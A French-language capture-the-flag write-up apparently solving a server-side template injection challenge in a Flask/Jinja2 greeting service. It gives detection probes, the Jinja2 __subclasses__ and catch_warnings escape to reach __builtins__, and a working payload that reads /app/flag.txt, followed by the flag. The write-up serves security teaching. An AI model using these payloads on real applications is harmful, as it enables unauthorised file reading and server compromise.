> Just a simple service made using Server Side Rendering.
>
> Session

Le challenge proposait un simple service de salutation : “Enter your name and we'll greet you!”. Le service utilisait du Server Side Rendering.

On commence par identifier la vulnérabilité : 

Premier test classique : {{7*7}}

Résultat : 49

Le moteur évalue les expressions -> Server-Side Template Injection

Autre test : {{config}}

Cela affiche l’objet de configuration Flask, preuve que nous sommes dans un environnement Flask + Jinja2.

On exploite ensuite la primitive classique Jinja2 : ''.__class__.__mro__[1].__subclasses__()

Cela permet d’accéder à toutes les classes Python chargées. On cherche une classe exploitable, notamment : warnings.catch_warnings

Pour trouver son index :
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if "catch_warnings" in c.__name__ %}{{ loop.index0 }} : {{ c }}{% endif %}{% endfor %}

Résultat :
```
211 : <class 'warnings.catch_warnings'>
```

Ensuite, on accède aux builtins : 
catch_warnings.__init__.__globals__ donne accès aux variables globales du module, incluant __builtins__.

On teste ensuite : {{ ''.__class__.__mro__[1].__subclasses__()[211].__init__.__globals__['__builtins__']['open']('/flag').read() }} (ne donne rien).

Puis ces variantes :

/flag.txt

/app/flag

/app/flag.txt

Payload final :
{{ ''.__class__.__mro__[1].__subclasses__()[211].__init__.__globals__['__builtins__']['open']('/app/flag.txt').read() }}

<details>
<summary>Flag</summary>

`0xfun{Server_Side_Template_Injection_Awesome}`

</details>
